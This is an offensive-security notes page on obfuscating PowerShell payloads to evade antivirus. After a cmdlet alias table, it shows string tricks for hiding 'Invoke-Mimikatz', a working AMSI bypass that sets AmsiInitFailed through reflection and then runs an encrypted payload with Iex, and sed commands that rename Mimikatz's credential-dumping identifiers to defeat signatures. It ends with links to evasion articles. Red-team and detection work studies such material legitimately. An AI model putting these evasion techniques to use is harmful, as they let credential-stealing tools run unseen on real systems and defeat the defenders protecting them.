---
author(s):
  - Userware
tags:
  - helpers
  - malware-development
  - defense-evasion
---
# PowerShell

TODO: Provide more ways to obfuscate powershell payload.

## 01 - Command Aliases

| Commands                         | Aliases                                               |
| -------------------------------- | ----------------------------------------------------- |
| `Set-Location`                   | [`cd` \| `chdir` \| `sl`]                             |
| `Get-ChildItem`                  | [`dir` \| `gci` \| `ls`]                              |
| `Get-Content`                    | [`cat` \| `gc` \| `type` \| `more`]                   |
| `New-Item`                       | (equivalent to `type nul` in CMD)                     |
| `Copy-Item`                      | [`copy` \| `cp` \| `cpi`]                             |
| `Move-Item`                      | [`mv` \| `mi` \| `move`]                              |
| `Rename-Item`                    | [`ren` \| `rni`]                                      |
| `Remove-Item`                    | [`del` \| `erase` \| `rd` \| `ri` \| `rm` \| `rmdir`] |
| `Get-Location`                   | [`gl` \| `pwd`]                                       |
| `Get-Acl`                        | (equivalent to `icacls.exe` in CMD)                   |
| `Invoke-Command`                 | `icm`                                                 |
| `Invoke-WmiMethod`               | `iwmi`                                                |
| `Invoke-Expression`              | `iex`                                                 |
| `Invoke-WebRequest`              | [`curl` \| `iwr` \| `wget`]                           |
| `Clear-host`                     | [`clear` \| `cls`]                                    |
| `Get-History`                    | [`ghy` \| `h` \| `history`]                           |
| `Clear-History`                  | `clhy`                                                |
| `Write-Host`                     |                                                       |
| `Write-Output`                   | [`echo` \| `write`]                                   |
| `Get-Process`                    | [`gps` \| `ps`]                                       |
| `Start-Process`                  | [`saps` \| `start`]                                   |
| `Stop-Process`                   | [`kill` \| `spps`]                                    |
| `Get-Service`                    | `gsv`                                                 |
| `Start-Service`                  | `sasv`                                                |
| `Stop-Service`                   | `spsv`                                                |
| `Select-Object`                  | `select`                                              |
| `Select-String`                  | `sls` (equivalent to `findstr.exe` in CMD)            |
| `Get-CimInstance`                | `gcim`                                                |
| `Get-ComputerInfo`               | `gin` (equivalent to "`systeminfo.exe`" in CMD)       |
| `Import-Module`                  | `ipmo`                                                |
| `Get-Module`                     | `gmo`                                                 |
| `New-Module`                     | `nmo`                                                 |
| `Remove-Module`                  | `rmo`                                                 |
| `Tee-Object`                     | `tee`                                                 |
| `Get-NetIPConfiguration`         | `gip` (equivalent to `ipconfig.exe` in CMD)           |
| `Get-NetIPAddress`               |                                                       |
| `Get-NetRoute`                   | (equivalent to `route.exe print` in CMD)              |
| `Test-Connection -Count <int>`   | (equivalent to `ping.exe -c <int>` in CMD)            |
| `Test-NetConnection -TraceRoute` | (equivalent to `tracert.exe` in CMD)                  |
| `Resolve-Dnsname`                | (equivalent to `nslookup.exe` in CMD)                 |
| `Get-PSDrive`                    | `gdr`                                                 |
| `New-PSDrive`                    | [`ndr` \| `mount`]                                    |
| `Remove-PSDrive`                 | `rdr`                                                 |
| `New-SmbMapping`                 | (equivalent to `net.exe use` in CMD)                  |
| `Get-SmbMapping`                 |                                                       |
| `Remove-SmbMapping`              | (equivalent to `net.exe use /delete` in CMD)          |
| `Get-SmbConnection`              | (equivalent to `net.exe share` in CMD)                |

## 02 - String Manipulation

### 2.1 - String Concatenation

```
PS C:\> "Invoke-" + "Mimikatz"
```

### 2.2 - Insert Comments

```
PS C:\> "Invoke-" <#inserting comment#> + "Mimikatz"
```

### 2.3 - Abstract Syntax Tree (AST)

```
PS C:\> Get-Command -name ("{1}{2}{0}{3}" -f "-Proces", "G", "et", "s")

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Get-Process                                        7.0.0.0    Microsoft.PowerShell.Management
```

### 2.4 - Encrypted Strings

```
$secureString = ConvertTo-SecureString -String '<payload>' -AsPlainText -force
$encoded = ConvertFrom-SecureString -k (0..15) $secureString > output.txt

$encoded = <encoded payload>
$Ref = [REF].Assembly.GetType('System.Management.Automation.AmsiUtils’);
$Ref.GetField(‘AmsiInitFailed','NonPublic,Static’).SetValue($null, $true);
$credential = [System.Management.Automation.PSCredential]::new("tim",(ConvertTo-SecureString -k (0..15)
$encoded))
Iex $credential.GetNetworkCredential().Password
```

## 03 - Modify PowerShell File

### 3.1 - Remove Semi-Colons

```
$ sed -i -e "s/\;/\n/g" payload.ps1
```

### 3.2 - Remove Spaces, Comments and Aliases

```
$ sed -i -e "/<#/,/#>/c\\" \
-e "s/^[[:space:]]*#.*$//g"
-e "/Set-Alias/d" payload.ps1
```

### 3.3 - Modify Variables and Concatenate Strings

Using `Invoke-Mimikatz` as an example.

```
$ sed -i "s/-Name VirtualProtect/<new_string>/g" \
-e "s/-Name WriteProcessMemory/<new_string>/g" \
-e "s/::logonPass/<new_string>/g" \
-e "s/DumpCreds/<new_variable>/g" \
-e "s/DumpCerts/<new_variable>/g" \
-e "s/CustomCommand/<new_variable>/g" \
-e "s/TypeBuilder/<new_variable>/g" \
-e "s/Win32Types/<new_variable>/g" \
-e "s/Win32Functions/<new_variable>/g" \
-e "s/shellcode/<new_variable>/g" \
-e "s/PEBytes64/<new_variable>/g" \
-e "s/PEBytes32/<new_variable>/g" \
-e "s/ArgumentPtr/<new_variable>/g" \
-e "s/CallDllMainSC1/<new_variable>/g" \
-e "s/'TVq/'TV'+'q/g" Invoke-Mimikatz.ps1
```

---
## References

### Daniel Bohannon

- [Daniel Bohannon: PowerShell Execution Argument Obfuscation (& How It Can Make Detection Easier!)](https://www.slideshare.net/slideshow/invokeobfuscation-derbycon-2016/66405101)

### Huebicode

- [huebicode: Powershell Obfuscation](https://huebicode.com/blog/powershell-obfuscation.html)

### t3l3machus

- [t3l3machus: Powershell Obfuscation Bible](https://github.com/t3l3machus/PowerShell-Obfuscation-Bible)

### gh0x0st

- [gh0x0st: Layer 0 Obfuscation](https://github.com/gh0x0st/Invoke-PSObfuscation/blob/main/layer-0-obfuscation.md)

### r00t 3xp10it

- [r00t-3xp10it: Simple Obfuscation](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md)

### Bordergate

- [Bordergate: Obfuscating Command Line Arguments](https://www.bordergate.co.uk/obfuscating-command-line-arguments/)

### Onlyf8

- [onlyf8: Powershell and Obfuscation](https://onlyf8.com/powershell-obfuscationEN)

### Offensive Security

- [Offensive Security: PowerShell Obfuscation](https://www.offensive-security.com/offsec/powershell-obfuscation/)

### klezvirus

- [klezvirus: Chameleon Born From a Chimera](https://klezvirus.github.io/RedTeaming/AV_Evasion/BornFromAChimera/)

### Jorge Lajara

- [Jorge Lajara: Powershell AV Evasion. Running Mimikatz with PowerLine](https://jlajara.gitlab.io/Mimikatz-AV-Evasion)

### geoda

- [geoda: Running an Obfuscated version of Mimikatz in Memory to bypass AntiVirus and other host based controls](https://blog.geoda-security.com/2018/05/running-obfuscated-version-of-mimikatz.html)

### Black Hills Information Security

- [Black Hills Information Security: How to Bypass Anti-Virus to Run Mimikatz](https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/)

### Digital Whisper

- [Digital Whisper: Fileless Attacks Part 2](https://www.digitalwhisper.co.il/files/Zines/0x8E/DW142-1-FilelessAttacks_Part2.pdf)

### CTFIoT

- [CTFIoT: Bypassing Windows Defender](https://www.ctfiot.com/112423.html)

### Dennis Chow

- [Dennis Chow: Fun with PowerShell Payload Execution and Evasion](https://medium.com/swlh/fun-with-powershell-payload-execution-and-evasion-f5051fd149b2)

### Hacking Articles

- [Hacking Articles: A Detailed Guide on AMSI Bypass](https://www.hackingarticles.in/a-detailed-guide-on-amsi-bypass/)

### Debugging AMSI Function

- [Winslow Blog: Bypass AMSI On Windows 11](https://winslow1984.com/books/red-team/page/bypass-amsi-on-windows-11)

### Wietze Beukema

- [Wietze Beukema: PowerShell Obfuscation using `SecureString`](https://www.wietzebeukema.nl/blog/powershell-obfuscation-using-securestring)